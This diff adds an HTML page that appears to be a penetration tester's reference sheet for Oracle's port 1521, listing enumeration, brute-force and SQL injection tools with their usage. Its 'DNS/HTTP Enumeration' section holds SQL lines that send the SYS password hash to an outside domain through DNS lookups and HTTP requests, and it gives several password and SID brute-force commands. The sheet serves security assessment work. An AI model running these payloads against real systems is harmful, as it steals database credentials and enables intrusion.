@@ -1,0 +1,114 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>1521: Oracle</title>
+</head><body><div style="text-align: left"><span style="font-family: sans-serif">Oracle Port 1521 Open</span></div><ul><li><img src="image.png" /> Oracle Enumeration</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.woany.co.uk/oracsec/">oracsec</a> <a href="http://www.woany.co.uk/oracsec/"><img src="image 2.png" /></a></li>
+<li><a href="http://www.red-database-security.com/">Repscan</a> <a href="http://www.red-database-security.com/"><img src="image 3.png" /></a></li>
+<li><a href="http://www.red-database-security.com/">Sidguess</a> <a href="http://www.red-database-security.com/"><img src="image 4.png" /></a></li>
+<li><a href="http://www.imperva.com/products/scuba.html">Scuba</a> <a href="http://www.imperva.com/products/scuba.html"><img src="image 5.png" /></a></li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/dns_http.htm">DNS/HTTP Enumeration</a> <a href="http://www.vulnerabilityassessment.co.uk/dns_http.htm"><img src="image 6.png" /></a></li>
+<li style="list-style-type: none"><ul><li>SQL&gt; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE US ERNAME='SYS')||'.vulnerabilityassessment.co.uk') FROM DUAL; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE USERNAM E='SYS')||'.vulnerabilityassessment.co.uk') FROM DUAL</li>
+<li></li>
+<li>SQL&gt; select utl_http.request('http://gladius:5500/'||(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME='SYS')) from dual;</li>
+<li></li>
+</ul>
+</li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/WinSID.zip">WinSID</a> <a href="http://www.vulnerabilityassessment.co.uk/WinSID.zip"><img src="image 7.png" /></a></li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/default_oracle_passwords.htm">Oracle default password list</a> <a href="http://www.vulnerabilityassessment.co.uk/default_oracle_passwords.htm"><img src="image 8.png" /></a></li>
+<li><a href="http://www.ngssoftware.com/">TNSVer</a> <a href="http://www.ngssoftware.com/"><img src="image 9.png" /></a></li>
+<li style="list-style-type: none"><ul><li>tnsver host [port]</li>
+</ul>
+</li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/tcp_scan.htm">TCP Scan</a> <a href="http://www.vulnerabilityassessment.co.uk/tcp_scan.htm"><img src="image 10.png" /></a></li>
+<li><a href="http://www.dokfleed.net/duh/modules.php?name=News&file=article&sid=35">Oracle TNSLSNR</a> <a href="http://www.dokfleed.net/duh/modules.php?name=News&file=article&sid=35"><img src="image 11.png" /></a></li>
+<li style="list-style-type: none"><ul><li>Will respond to: [ping] [version] [status] [service] [change_password] [help] [reload] [save_config] [set log_directory] [set display_mode] [set log_file] [show] [spawn] [stop]</li>
+</ul>
+</li>
+<li><a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd">TNSCmd</a> <a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd"><img src="image 12.png" /></a></li>
+<li style="list-style-type: none"><ul><li>perl tnscmd.pl -h ip_address</li>
+<li>perl tnscmd.pl version -h ip_address</li>
+<li>perl tnscmd.pl status -h ip_address</li>
+<li>perl tnscmd.pl -h ip_address --cmdsize (40 - 200)</li>
+</ul>
+</li>
+<li><a href="http://www.integrigy.com/security-resources/downloads/lsnrcheck-tool/">LSNrCheck</a> <a href="http://www.integrigy.com/security-resources/downloads/lsnrcheck-tool/"><img src="image 13.png" /></a></li>
+<li><a href="http://www.ensyncsolutions.com/downloads.html">Oracle Security Check (needs credentials)</a> <a href="http://www.ensyncsolutions.com/downloads.html"><img src="image 14.png" /></a></li>
+<li><a href="http://www.cqure.net/wp/">OAT</a> <a href="http://www.cqure.net/wp/"><img src="image 15.png" /></a></li>
+<li style="list-style-type: none"><ul><li>sh opwg.sh -s ip_address</li>
+<li>opwg.bat -s ip_address</li>
+<li>sh oquery.sh -s ip_address -u username -p password -d SID OR c:\oquery -s ip_address -u username -p password -d SID</li>
+</ul>
+</li>
+<li><a href="http://www.cqure.net/wp/">OScanner</a> <a href="http://www.cqure.net/wp/"><img src="image 16.png" /></a></li>
+<li style="list-style-type: none"><ul><li>sh oscanner.sh -s ip_address</li>
+<li>oscanner.exe -s ip_address</li>
+<li>sh reportviewer.sh oscanner_saved_file.xml</li>
+<li>reportviewer.exe oscanner_saved_file.xml</li>
+</ul>
+</li>
+<li><a href="http://www.ngssoftware.com/squirrelora.htm">NGS Squirrel for Oracle</a> <a href="http://www.ngssoftware.com/squirrelora.htm"><img src="image 17.png" /></a></li>
+<li><a href="http://www.ngssoftware.com/">Service Register</a> <a href="http://www.ngssoftware.com/"><img src="image 18.png" /></a></li>
+<li style="list-style-type: none"><ul><li>Service-register.exe ip_address</li>
+</ul>
+</li>
+<li><a href="http://www.red-database-security.com/software/plsqlscanner.html">PLSQL Scanner 2008</a> <a href="http://www.red-database-security.com/software/plsqlscanner.html"><img src="image 19.png" /></a></li>
+</ul>
+</li>
+<li><img src="image 20.png" /> Oracle Brute Force</li>
+<li style="list-style-type: none"><ul><li><a href="http://www.databasesecurity.com/dbsec/OAK.zip">OAK</a> <a href="http://www.databasesecurity.com/dbsec/OAK.zip"><img src="image 21.png" /></a></li>
+<li style="list-style-type: none"><ul><li>ora-getsid hostname port sid_dictionary_list</li>
+<li>ora-auth-alter-session host port sid username password sql</li>
+<li>ora-brutesid host port start</li>
+<li>ora-pwdbrute host port sid username password-file</li>
+<li>ora-userenum host port sid userlistfile</li>
+<li>ora-ver -e (-f -l -a) host port</li>
+</ul>
+</li>
+<li><a href="http://www.ngssoftware.com/">breakable (Targets Application Server Port)</a> <a href="http://www.ngssoftware.com/"><img src="image 22.png" /></a></li>
+<li style="list-style-type: none"><ul><li>breakable.exe host url [port] [v]host ip_address of the Oracle Portal Serverurl PATH_INFO i.e. /pls/orassoport TCP port Oracle Portal Server is serving pages fromv verbose</li>
+</ul>
+</li>
+<li><a href="http://www.ngssoftware.com/">SQLInjector (Targets Application Server Port)</a> <a href="http://www.ngssoftware.com/"><img src="image 23.png" /></a></li>
+<li style="list-style-type: none"><ul><li>sqlinjector -t ip_address -a database -f query.txt -p 80 -gc 200 -ec 500 -k NGS SOFTWARE -gt SQUIRREL</li>
+<li>sqlinjector.exe -t ip_address -p 7777 -a where -gc 200 -ec 404 -qf q.txt -f plsql.txt -s oracle</li>
+</ul>
+</li>
+<li><a href="http://www.red-database-security.com/">Check Password</a> <a href="http://www.red-database-security.com/"><img src="image 24.png" /></a></li>
+<li><a href="http://www.toolcrypt.org/index.html">orabf</a> <a href="http://www.toolcrypt.org/index.html"><img src="image 25.png" /></a></li>
+<li style="list-style-type: none"><ul><li>orabf [hash]:[username] [options]</li>
+</ul>
+</li>
+<li><a href="http://freeworld.thc.org/thc-orakel/">thc-orakel</a> <a href="http://freeworld.thc.org/thc-orakel/"><img src="image 26.png" /></a></li>
+<li style="list-style-type: none"><ul><li>Cracker</li>
+<li>Client</li>
+<li>Crypto</li>
+</ul>
+</li>
+<li><a href="http://www.codework.com/dbvis/product.html">DBVisualisor</a> <a href="http://www.codework.com/dbvis/product.html"><img src="image 27.png" /></a></li>
+<li style="list-style-type: none"><ul><li><a href="http://www.pentest.co.uk/">Sql scripts from pentest.co.uk</a> <a href="http://www.pentest.co.uk/"><img src="image 28.png" /></a></li>
+<li>Manual sql input of previously reported vulnerabilties</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><img src="image 29.png" /> Oracle Reference Material</li>
+<li style="list-style-type: none"><ul><li><a href="http://infys.net/papers/Sql_Injection.pdf#search=%22hardik%20shah%20sql%20injection%22">Understanding SQL Injection <img src="image 30.png" /></a></li>
+<li><a href="http://www.securiteam.com/securityreviews/5DP0N1P76E.html">SQL Injection walkthrough</a> <a href="http://www.securiteam.com/securityreviews/5DP0N1P76E.html"><img src="image 31.png" /></a></li>
+<li><a href="http://www.imperva.com/application_defense_center/white_papers/blind_sql_server_injection.html">SQL Injection by example</a> <a href="http://www.imperva.com/application_defense_center/white_papers/blind_sql_server_injection.html"><img src="image 32.png" /></a></li>
+<li><a href="http://security-papers.globint.com.ar/oracle_security/sql_injection_in_oracle.php">Advanced SQL Injection in Oracle databases</a> <a href="http://security-papers.globint.com.ar/oracle_security/sql_injection_in_oracle.php"><img src="image 33.png" /></a></li>
+<li><a href="http://www.imperva.com/application_defense_center/white_papers/blind_sql_server_injection.html">Blind SQL Injection</a> <a href="http://www.imperva.com/application_defense_center/white_papers/blind_sql_server_injection.html"><img src="image 34.png" /></a></li>
+<li>SQL Cheatsheets</li>
+<li style="list-style-type: none"><ul><li></li>
+<li>http://ha.ckers.org/sqlinjection</li>
+<li>http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</li>
+<li>http://www.0x000000.com/?i=14</li>
+<li>http://pentestmonkey.net/?</li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+&nbsp;</body></html>
